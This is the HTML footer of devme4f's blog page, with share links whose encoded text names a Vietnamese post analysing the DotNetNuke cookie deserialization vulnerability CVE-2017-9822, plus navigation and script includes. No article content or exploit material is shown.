    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&name=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE&description=Preface%20DotNetNuke%20l%c3%a0%20h%e1%bb%87%20th%e1%bb%91ng%20qu%e1%ba%a3n%20l%c3%bd%20n%e1%bb%99i%20dung%28content%20management%20system%29%20m%c3%a3%20ngu%e1%bb%93n%20m%e1%bb%9f%20tr%c3%aan%20n%e1%bb%81n%20t%e1%ba%a3ng%20ASP.NET.%20B%c3%a0i%20vi%e1%ba%bft%20n%c3%a0y%20s%e1%ba%bd%20%c4%91i%20v%c3%a0o%20ph%c3%a2n%20t%c3%adch%20CVE-2017-9822%20tr%c3%aan%20DNN%2c%20l%e1%bb%97%20h%e1%bb%95ng%20unauth%20insecure%20deserialization%20c%c3%b3%20th%e1%bb%83%20d%e1%ba%abn%20%c4%91%e1%ba%bfn%20RCE.%20L%e1%bb%97%20h%e1%bb%95ng%20%c4%91%c6%b0%e1%bb%a3c%20%c4%91%c6%b0%e1%bb%a3c%20ph%c3%a1t%20hi%e1%bb%87n%20b%e1%bb%9fi%20Alvaro%20Mun%cc%83oz%20v%c3%a0%20tr%c3%acnh%20b%c3%a0y%20t%e1%ba%a1i%20blackhat%20US%202017%20-%20Friday%20the%2013th%20JSON%20Attacks%20g%e1%bb%93m%20nhi%e1%bb%81u%20advanced%20techniques%20v%e1%bb%81%20khai%20th%c3%a1c%20java%2f.net%20deserialization%2c%20%c4%91%c6%b0%e1%bb%a3c%20coi%20nh%c6%b0%20m%e1%bb%9f%20ra%20k%e1%bb%b7%20nguy%c3%aan%20m%e1%bb%9bi%20v%e1%bb%81%20khai%20th%c3%a1c%20lo%e1%ba%a1i%20l%e1%bb%97%20h%e1%bb%95ng%20n%c3%a0y%21" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&t=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  devme4f&#39;s blog 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
